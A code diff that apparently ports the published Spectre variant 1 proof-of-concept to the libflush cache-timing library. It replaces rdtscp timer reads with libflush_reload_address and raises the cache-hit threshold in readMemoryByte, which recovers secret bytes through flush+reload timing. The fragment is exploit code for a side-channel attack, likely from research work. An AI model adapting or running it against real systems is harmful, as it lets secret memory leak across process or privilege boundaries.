@@ -3,12 +3,6 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
-#ifdef _MSC_VER
-#include <intrin.h> /* for rdtscp and clflush */
-#pragma optimize("gt",on)
-#else
-#include <x86intrin.h> /* for rdtscp and clflush */
-#endif
 
 #define ALIGN_CACHE __attribute__ ((aligned (512)))
 
@@ -30,7 +24,7 @@ Analysis code
 ********************************************************************/
 
 /* TODO: How is it affected by frequency scaling? */
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (100) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, uint8_t value[2], int score[2]) {
@@ -38,7 +32,6 @@ void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, u
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
-  register uint64_t time1, time2;
   volatile uint8_t * addr;
 
   for (i = 0; i < 256; i++)
@@ -70,10 +63,8 @@ void readMemoryByte(libflush_session_t* libflush_session, uint8_t* target_ptr, u
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+      uint64_t access_time = libflush_reload_address(libflush_session, (void*)addr);
+      if (access_time <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
           results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
